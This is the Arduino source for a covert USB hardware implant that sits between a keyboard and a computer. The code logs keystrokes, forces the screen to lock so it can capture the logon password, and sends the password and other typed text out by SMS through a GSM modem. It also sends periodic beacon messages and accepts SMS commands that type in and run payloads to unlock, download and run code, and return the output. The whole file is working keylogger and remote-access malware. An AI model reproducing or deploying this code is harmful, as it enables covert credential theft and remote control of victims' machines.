/* NOTE: Make sure to edit SoftwareSerial.h to change
   #define _SS_MAX_RX_BUFF 64 // RX buffer size
   to
   #define _SS_MAX_RX_BUFF 256 // RX buffer size
   You need to set your configuration in globals.h
*/
#include <SoftwareSerial.h>
#include <Keyboard.h>
#include "C_USBhost.h"
#include "Payloads.h"
#include "utils.h"
#include "globals.h"
#include "FingerprintUSBHost.h"

unsigned long previousMillis = 0;          // used for calculating time since last key typed
unsigned long previousMillisBeacon = 0;
unsigned long insertedMillis =  millis();  // usefull for calculating time from usb insertion
unsigned long previousFailSMSMillis = 0;
String os = "unsure";
String expect = "";                       // keywords to expect from command execution if successfull
String cellsignal = "nn";
bool firstExecution = true;
bool gotLang = false;
bool gotAutorun = false;
String password = "";
bool sendPass = false;
byte captured_key;
bool pendingSMS = false;
String buffer_keystrokes = "";
unsigned int pendingLength = 0;

#ifdef GETPASS                // Work as a smart keylogger to first get user password after unlock
  bool gotPass = false;
#else                         // Work as a simple keylogger, just capture and send keys when ready
  bool gotPass = true;
#endif

#ifdef DEBUG
  unsigned long interval = 3000;  // milisecs to wait before sending sms or execute payload
  C_USBhost USBhost = C_USBhost(Serial1, 1);   // Serial port 1 definition for debugging messages
#else
  unsigned long interval = 60000; // milisecs to wait before sending sms or execute payload
  C_USBhost USBhost = C_USBhost(Serial1, 0);
#endif

SoftwareSerial SMSSERIAL(8, 9);  // Defines pins for tx and rx to communicate with SIM800L


//////////////////////////////////////////////////////////////////////////////////////////// Initialization code
void setup() {
  delay(3000);  // wait some secs to let the system recognize devices
  Serial.begin(BAUD_RATE_SERIAL);
  Serial.setTimeout(100);   // This is needed to prevent the keylogger to hang out when sending a SMS since the default timeout is 1 sec
  Keyboard.begin();

  FingerprintUSBHost.guessHostOS(os);  // Try to guess the user OS

  #ifndef DEBUGWITHOUTSIM  // normal execution with SIM card
    USBhost.Begin(BAUD_RATE_USB_HOST_BOARD);
    configureModem();

    #ifdef DEBUG
      collectDebugInfo();
      collectSimInfo();
    #endif
  
    #ifdef BEACON
      cellsignal = getModemSignal();  // get signal value to inform in beacon
    #endif
  #endif // DEBUGWITHOUTSIM                                        

  #ifdef LOCKPC             // Force locking PC to capture later logon password 
    if(os == F("Windows")) {
      lockWindowsLinux();
    } else if(os == F("Linux")) {
      lockWindowsLinux();
    } else if(os == F("MacOS")) {
      lockMacOs();
    } else {
      lockWindowsLinux();
      lockMacOs();
    }
  #endif

}
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////


////////////////////////////////////////////////////////////////////////////////////////////////  Main execution loop
void loop() {
  unsigned long currentMillis = millis();

  //////////////////////////////////////////// Beacon method: Send periodic SMS to inform user that implant is online
  // ToDo: this can infere with payloads execution. Use only when user is not typing
  #ifdef BEACON
    if (firstExecution || !pendingSMS && (unsigned long)((currentMillis - previousMillisBeacon) / 60000) >= BEACON_TIME) {
      firstExecution = false;
      String msg = IMPLANT_NAME;
      msg += "(";
      msg += os; // add possible os in the beacon
      msg += ")-Online(signal:";
      msg += cellsignal;
      msg += "/31)";
      #ifdef DEBUG
          Serial.print(F("Sending beacon SMS:"));
          Serial.println(msg);
      #endif
      sendSMSMessage(msg);
      previousMillisBeacon = currentMillis;
    }
  #endif
  //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

  
  //////////////////////////////////////////////////////////////////////////////////////// Keylogger method: key capture
  #ifdef KEYLOGGER
    captured_key = USBhost.GetKey();
    if (captured_key) {
      if (captured_key == 8) {                                 // Backspace code received, remove previous char
        if (buffer_keystrokes.length() > 0) {
          buffer_keystrokes = buffer_keystrokes.substring(0, buffer_keystrokes.length() - 1);
        }
      } else if (captured_key > 9 && captured_key < 14) {      // Check for any kind of CR/LF/FF char
          if (gotPass) {
              #ifdef DEBUG
                  Serial.println(F("Got CR"));
              #endif
              if (buffer_keystrokes.length() <  MAX_BUFFER_SIZE) { 
              buffer_keystrokes += (char)captured_key;
            }
          } else {
            #ifdef DEBUG
                Serial.println(F("Got CR. Password detected!"));
            #endif
            gotPass = true;
            sendPass = true;
          }
      } else if (captured_key == 27) {                         // ESC key received, remove previous char
          if (buffer_keystrokes.length() <  MAX_BUFFER_SIZE) {
            buffer_keystrokes += (char)"~";
          }
      } else if (captured_key >= 32) {                         // Ignore not printable characters before 32
          // Arduino doesn't have a lot of memory, so we need to define a max size for the buffer
          // if more characters arrive after the buffer if full it discards them (we prioritize older
          /// text because prob the first thing typed is the password)
          if (buffer_keystrokes.length() <  MAX_BUFFER_SIZE) {
            buffer_keystrokes += (char)captured_key;
          }
        }
        previousMillis = currentMillis;                       // update last key timestamp
    }
  
    // Send keystrokes to SMS if necessary
    if (buffer_keystrokes.length() >= SMS_CHAR_LIMIT - 1 || sendPass || (unsigned long)(currentMillis - previousMillis) >= interval && buffer_keystrokes.length() > 5) {
      if (currentMillis - previousFailSMSMillis >  10000) { // delay 10 seconds between trying sending SMS if it failed
        if (!pendingSMS) {                                  // The buffer could hold a lot of characters from previous SMS that couldn't be sent
          String bufferToSend = "";
          if (buffer_keystrokes.length() < SMS_CHAR_LIMIT - 1) {
            bufferToSend = buffer_keystrokes;
          } else {
              bufferToSend = buffer_keystrokes.substring(0, SMS_CHAR_LIMIT - 1);
          }
          if (sendPass) {   // first time here, means password detected
            sendPass = false;  // we got the password
            password = buffer_keystrokes;
            bufferToSend = "Password:" + password;
          }
          #ifdef DEBUG
                  Serial.print(F("Going to send SMS with content: "));
                  Serial.println(bufferToSend);
          #endif
          sendSMSMessage(bufferToSend);
          pendingSMS = true;
          pendingLength = bufferToSend.length();
        } else {
            #ifdef DEBUGD
              Serial.println(F("There is a SMS pending to be sent..."));
            #endif
        }
      }
    }

  #else   // keylogger method is not active, but it's interesting to know if user is typing (active)
    if (USBhost.GetKey()) {
        previousMillis = currentMillis;                       // update last key timestamp
    }
  #endif
  /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////


  //////////////////////////////////////////////////////////////////////////////////// Try to get system keyboard language
  //////////////// Having an exfil com port for getting payload results means converting a dump badusb into a smart badusb
  //////////////// (by @yadox 2019)
  #ifdef GETLANG
    if (!gotLang && (unsigned long)(currentMillis - previousMillis) >= interval) {
      if(os == F("Windows")) {
        openTerminalWindows();
        runAndExfilWindows("Get-WinSystemLocale");   //To-Do: check if it gets info or can be changed by Set-WinSystemLocale en-US
        gotLang = true;
        exitTerminalWindowsLinux();
      } else if(os == F("Linux")) {
        if (gotPass) {
          openTerminalLinux();
          runAndExfilLinux("setxkbmap -query", password);
          exitTerminalWindowsLinux();
          expect = "Layout:";  // command output keyword/s to expect if command ran successfully
          gotLang = true;
        }
      } else if(os == F("MacOS")) {
        openTerminalMacOs();
        runAndExfilMacOs("defaults read ~/Library/Preferences/com.apple.HIToolbox.plist AppleSelectedInputSources | egrep -w 'KeyboardLayout Name' | sed -E 's/^.+ = \"?([^\"]+)\"?;$/\1/'");
        exitTerminalMultiOs();
        gotLang = true;
      }
    }
  #endif
  /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////


  //////////////////////////////////////////////////////////// If pending SMS, check if sent and remove the characters sent
  if (pendingSMS) {
    if (SMSSERIAL.available()) {
      String res = SMSSERIAL.readString();
      #ifdef DEBUG
        Serial.print(F("Message read from SMSSERIAL: "));
        Serial.println(res);
      #endif
      if (res.indexOf(F("CMGS: ")) > 0) {
        #ifdef DEBUG
            Serial.println(F("SMS succesfully sent"));
        #endif
        SMSSerialFlush(); // just is case there is something else in the serial

        #ifdef KEYLOGGER
          // We removed from the buffer the characters that were sent
          buffer_keystrokes = buffer_keystrokes.substring(pendingLength);
        #endif
        
      } else if (res.indexOf(F("ERROR: "))) { // The SMS couldn't be sent, we need to retry
        #ifdef DEBUG
          Serial.print(F("ERROR trying to send SMS with content: "));
          Serial.println(buffer_keystrokes.substring(0, pendingLength));
        #endif
        previousFailSMSMillis = currentMillis;
      }
      pendingSMS = false;
   }
  }
  /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////


 //////////////////////////////////////////////////////////////////// Payload method: user sent a SMS to execute a payload
 //////////// Payload Method Make sure keyword are unique enough that subject in question wont enter them on their keyboard
 #ifdef DEBUGWITHOUTSIM
    if (true) {
  #else
    if (!pendingSMS && SMSSERIAL.available()) {
  #endif
  
  String SMS = SMSSERIAL.readString();

  #ifdef AUTORUN  // user defined badusb payload to be run on USB connection
    if (!gotAutorun && insertedMillis > 20000) {                  // Just run once and let the OS enough time to indentify HID drivers
      SMS = F("+CMT: blablabla\r\n");   // To simulate a real SMS:
      SMS += AUTORUN;                   // Insert the autorun payload defined in globals.h
      gotAutorun = true;
    }
  #else
    #ifdef DEBUGWITHOUTSIM_PAYLOAD  
      delay(30000);                     // We wait a little bit so the OS has time to identify the keyboard
      SMS = F("+CMT: blablabla\r\n");   // To simulate a real SMS:
      SMS += DEBUGWITHOUTSIM_PAYLOAD;   // Insert the debugging payload defined in globals.h
    #endif
  #endif
  
  if (SMS.indexOf(F("+CMT: ")) > -1) {             // A command is received (+CMT: command)
    String SMS_text;
    if (SMS.charAt(SMS.length()) == '\n' &&  SMS.charAt(SMS.length() - 1) == '\r') {      // Code to remove last new line character if present
      SMS.remove(SMS.length() - 1, SMS.length());
    }
    int new_line_pos = SMS.indexOf("\r\n", 2);
    SMS_text = SMS.substring(new_line_pos + 2);             // +2 is BC \r\n

    #ifdef DEBUG
      Serial.println(F("Received SMS with content:"));
      Serial.println(SMS_text);
    #endif

    String payload = getValue(SMS_text, SEPARATOR, 0);

    #ifdef DEBUG
          if (payload.length() > 0) {
            Serial.print(F("Got payload: "));
            Serial.println(payload);
          }
    #endif
  
    // Posible payload requests:  UnlockDownload, UnlockRunAndExfil, Manual
    if (payload == F("UnlockDownload")) {
      unlockDownload(SMS_text);
    } else if (payload == F("UnlockRunAndExfil")) {
        unlockRunAndExfil(SMS_text);
    } else if (payload == F("Manual")) {
        manualPayload(SMS_text);
    } else {  //unknown payload
        #ifdef DEBUG
          Serial.print(F("Unknown payload "));
          Serial.println(payload);
        #endif
        sendSMSMessage("Unknown payload requested '" + payload + "'\nFull SMS: " + SMS_text);
    }
    #ifdef DEBUGWITHOUTSIM
      delay(30000);  // After executing a fake payload it should sleep
    #endif
    }
  }
  /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////


  ////////////////////////////////////////////////// Exfil Method: Read from the exfil serial port and forward data via SMS
  ////////////////////////////// This method is more powerfull than imagined. It can convert a dumb badusb into a smart one
  if (Serial.available()) {
    String output = Serial.readString();
    if (expect == "") {
      sendSMSMessage("Out:" + output);
    } else if (output.indexOf(expect) > -1) {  // compare expect with output and parse result
      // parse result
      expect = "";
    } else {         // wrong result
      expect = "";
    }
  }
  /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

}
